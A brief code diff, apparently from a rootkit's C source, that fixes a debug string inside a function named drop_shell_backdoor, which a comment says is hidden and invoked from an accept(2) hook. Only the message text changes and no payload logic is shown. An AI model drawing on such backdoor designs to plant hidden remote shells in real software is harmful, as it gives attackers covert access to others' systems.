@@ -186,7 +186,7 @@ static int  drop_pty_connection(int sock) {
  * this hidden function is called by accept(2) hook.
  */
 int         drop_shell_backdoor(int sock, struct sockaddr *addr) {
-    DEBUG(D_INFO, "drop_backdoor_shell() called.");
+    DEBUG(D_INFO, "drop_shell_backdoor() called.");
 
     struct sockaddr_in *sa_in;
     uint16_t sin_port;
